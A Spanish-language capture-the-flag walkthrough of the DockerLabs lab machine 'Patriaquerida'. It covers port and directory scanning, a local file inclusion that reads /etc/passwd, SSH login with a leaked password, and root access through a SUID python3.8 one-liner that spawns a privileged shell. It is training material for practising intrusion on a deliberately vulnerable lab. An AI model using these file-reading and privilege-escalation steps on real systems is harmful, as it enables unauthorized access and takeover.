---
icon: flag
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Patriaquerida DockerLabs (Easy)

## Instalación

Cuando obtenemos el `.zip` nos lo pasamos al entorno en el que vamos a empezar a hackear la maquina y haremos lo siguiente.

```shell
unzip patriaquerida.zip
```

Nos lo descomprimira y despues montamos la maquina de la siguiente forma.

```shell
bash auto_deploy.sh patriaquerida.tar
```

Info:

```
                            ##        .         
                      ## ## ##       ==         
                   ## ## ## ##      ===         
               /""""""""""""""""\___/ ===       
          ~~~ {~~ ~~~~ ~~~ ~~~~ ~~ ~ /  ===- ~~~
               \______ o          __/           
                 \    \        __/            
                  \____\______/               
                                          
  ___  ____ ____ _  _ ____ ____ _    ____ ___  ____ 
  |  \ |  | |    |_/  |___ |__/ |    |__| |__] [__  
  |__/ |__| |___ | \_ |___ |  \ |___ |  | |__] ___] 
                                         
                                     

Estamos desplegando la máquina vulnerable, espere un momento.

Máquina desplegada, su dirección IP es --> 172.17.0.2

Presiona Ctrl+C cuando termines con la máquina para eliminarla
```

Por lo que cuando terminemos de hackearla, le damos a `Ctrl+C` y nos eliminara la maquina para que no se queden archivos basura.

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-14 13:29 EST
Nmap scan report for express.dl (172.17.0.2)
Host is up (0.000024s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 e1:b8:ce:5c:65:5a:75:9e:ed:30:7a:2b:b2:25:47:6b (RSA)
|   256 a3:78:9f:44:57:0e:15:4f:15:93:59:d0:04:89:a9:f4 (ECDSA)
|_  256 5a:7a:89:3c:ed:da:4a:b4:a0:63:d3:ba:04:39:c3:a4 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.41 (Ubuntu)
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.36 seconds
```

Si entramos en el puerto `80` veremos una pagina normal de `apache2` por lo que haremos un poco de `fuzzing`:

## Gobuster

```shell
gobuster dir -u http://<IP>/ -w <WORDLIST> -x html,php,txt -t 100 -k -r
```

Info:

```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2/
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,php,txt
[+] Follow Redirect:         true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htaccess.html       (Status: 403) [Size: 275]
/.htpasswd            (Status: 403) [Size: 275]
/.htaccess.txt        (Status: 403) [Size: 275]
/.htaccess.php        (Status: 403) [Size: 275]
/.htaccess            (Status: 403) [Size: 275]
/.htpasswd.html       (Status: 403) [Size: 275]
/.htpasswd.php        (Status: 403) [Size: 275]
/.htpasswd.txt        (Status: 403) [Size: 275]
/index.html           (Status: 200) [Size: 10918]
/index.php            (Status: 200) [Size: 110]
/server-status        (Status: 403) [Size: 275]
Progress: 81876 / 81880 (100.00%)
===============================================================
Finished
===============================================================
```

Vemos un `index.php` por lo que entraremos a el y veremos el siguiente mensaje:

```
Bienvenido al servidor CTF Patriaquerida.¡No olvides revisar el archivo oculto en /var/www/html/.hidden_pass!
```

Por lo que podemos deducir que en la `URL` tendremos que poner lo siguiente:

```
URL = http://<IP>/.hidden_pass
```

Vemos solamente la palabra `balu`.

Por lo que vamos a ver si tiene algun parametro vulnerable el `index.php` del la siguiente forma:

## Escalate user pinguino

### FFUF

```shell
ffuf -u http://<IP>/index.php?FUZZ=/etc/passwd -w <WORDLIST> -fs 110
```

Info:

```

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://172.17.0.2/index.php?FUZZ=/etc/passwd
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/big.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 110
________________________________________________

page                    [Status: 200, Size: 1367, Words: 11, Lines: 27, Duration: 0ms]
:: Progress: [20469/20469] :: Job [1/1] :: 83 req/sec :: Duration: [0:00:04] :: Errors: 0 ::
```

Vemos que nos saca una la cual puede leer el `passwd`, por lo que veremos que contiene dicho archivo:

```
URL = http://<IP>/index.php?page=/etc/passwd
```

Info:

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:101:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:104:105::/nonexistent:/usr/sbin/nologin
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
pinguino:x:1000:1000::/home/pinguino:/bin/bash
mario:x:1001:1001::/home/mario:/bin/bash
```

Vemos a 2 usuarios, por lo que intentaremos a ver cual de los 2 usuarios tiene la contraseña `balu` de la siguiente forma:

### SSH

```shell
ssh pinguino@<IP>
```

Metemos como contraseña `balu` y veremos que estamos dentro.

## Escalate user mario

Si leemos la nota llamada `nota_mario.txt` veremos lo siguiente:

```shell
cat nota_mario.txt
```

Info:

```
La contraseña de mario es: invitaacachopo
```

Por lo que la probaremos de la siguiente forma:

```shell
su mario
```

Metemos como contraseña `invitaacachopo` y veremos que somo dicho usuario.

## Escalate Privileges

Si listamos los permisos `SUID` veremos lo siguiente:

```shell
find / -type f -perm -4000 -ls 2>/dev/null
```

Info:

```
1972651    468 -rwsr-xr-x   1 root     root       477672 Jan  2  2024 /usr/lib/openssh/ssh-keysign
  1972603     52 -rwsr-xr--   1 root     messagebus    51344 Oct 25  2022 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
  1966385     52 -rwsr-xr-x   1 root     root          53040 Feb  6  2024 /usr/bin/chsh
  1966508     44 -rwsr-xr-x   1 root     root          44784 Feb  6  2024 /usr/bin/newgrp
  1966519     68 -rwsr-xr-x   1 root     root          68208 Feb  6  2024 /usr/bin/passwd
  1966582     68 -rwsr-xr-x   1 root     root          67816 Apr  9  2024 /usr/bin/su
  1966446     88 -rwsr-xr-x   1 root     root          88464 Feb  6  2024 /usr/bin/gpasswd
  1966503     56 -rwsr-xr-x   1 root     root          55528 Apr  9  2024 /usr/bin/mount
  1983378      4 -rwsr-xr-x   1 root     root            320 Oct 11 04:09 /usr/bin/man
  1966607     40 -rwsr-xr-x   1 root     root          39144 Apr  9  2024 /usr/bin/umount
  1966379     84 -rwsr-xr-x   1 root     root          85064 Feb  6  2024 /usr/bin/chfn
  1983393   5364 -rwsr-xr-x   1 root     root        5490488 Nov  7 14:10 /usr/bin/python3.8
  1972421    164 -rwsr-xr-x   1 root     root         166056 Apr  4  2023 /usr/bin/sudo
```

Y nos interesa esta en concreto:

```
1983393   5364 -rwsr-xr-x   1 root  root   5490488 Nov  7 14:10 /usr/bin/python3.8
```

Por lo que haremos lo siguiente:

```shell
python3.8 -c 'import os; os.execl("/bin/bash", "sh", "-p")'
```

Info:

```
sh-5.0# whoami
root
```

Y con esto seremos `root`, por lo que habremos terminado la maquina.
